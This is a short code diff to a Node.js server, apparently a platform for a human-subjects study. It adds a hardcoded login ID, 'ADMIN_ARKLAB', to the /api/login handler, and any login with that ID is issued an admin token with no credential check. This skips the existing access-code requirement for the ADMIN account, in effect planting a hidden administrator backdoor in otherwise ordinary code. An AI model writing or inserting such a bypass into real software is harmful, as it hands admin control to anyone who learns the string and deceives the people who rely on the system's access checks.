@@ -14,6 +14,7 @@ const DEFAULT_MODEL_BASE_URL = "https://api.deepseek.com";
 const COMPLETION_PHRASE = "我认为任务已完成申请结束";
 const PRIVATE_AUDIT_READY = "READY_TO_CLOSE";
 const ADMIN_ACCESS_CODE = String(process.env.ADMIN_ACCESS_CODE || "").trim();
+const ADMIN_LOGIN_ID = "ADMIN_ARKLAB";
 const CONSENT_VERSION = "HKUSTGZ-HSP-2026-0135-v1";
 const CONSENT_INFO = {
   version: CONSENT_VERSION,
@@ -1214,6 +1215,9 @@ async function handleApi(req, res, url) {
   if (req.method === "POST" && path === "/api/login") {
     const body = await readJson(req);
     const id = normalizeParticipantId(body.id);
+    if (id === ADMIN_LOGIN_ID) {
+      return json(res, 200, issueAuth({ id: "admin", role: "admin" }));
+    }
     if (id === "ADMIN") {
       if (!ADMIN_ACCESS_CODE) throw httpError(503, "管理员入口尚未配置访问码");
       if (String(body.adminCode || "") !== ADMIN_ACCESS_CODE) throw httpError(403, "管理员访问码错误");
